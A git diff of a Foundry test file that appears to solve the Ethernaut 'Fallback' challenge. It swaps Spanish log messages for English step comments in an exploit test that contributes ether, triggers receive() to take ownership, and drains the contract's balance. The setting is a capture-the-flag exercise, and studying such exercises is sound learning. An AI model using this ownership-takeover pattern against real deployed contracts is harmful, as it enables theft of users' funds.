@@ -6,30 +6,32 @@ import {Test, console} from "forge-std/Test.sol";
 import {Fallback} from "../src/Fallback.sol";
 
 contract FallbackTest is Test {
-    Fallback public levelInstance;
+    Fallback public fallbackContract;
     address public attacker = makeAddr("attacker");
 
     function setUp() public {
-        levelInstance = new Fallback();
+        fallbackContract = new Fallback();
         vm.deal(attacker, 1 ether);
     }
 
     function testExploit() public {
         vm.startPrank(attacker);
 
-        console.log("Contribute con 0.0001 ether...");
-        levelInstance.contribute{value: 0.0005 ether}();
+        // Step 1: Send some ether to the contract
+        fallbackContract.contribute{value: 0.0005 ether}();
 
-        console.log("Enviando ether directamente para activar receive()...");
-        (bool success, ) = address(levelInstance).call{value: 1 wei}("");
+        // Step 2: Send some ether directly to execute the `receive` function
+        (bool success, ) = address(fallbackContract).call{value: 1 wei}("");
         require(success, "Transfer failed");
 
-        assertEq(levelInstance.owner(), attacker);
-        console.log("Ownership secuestrado con exito!");
+        // Step 3: Check we got the ownership of the contract
+        assertEq(fallbackContract.owner(), attacker);
 
-        levelInstance.withdraw();
-        assertEq(address(levelInstance).balance, 0);
-        console.log("Contrato drenado. Balance final: 0");
+        // Step 4: Execute the withdraw function
+        fallbackContract.withdraw();
+
+        // Step 5: Balance token drained successfully
+        assertEq(address(fallbackContract).balance, 0);
 
         vm.stopPrank();
     }
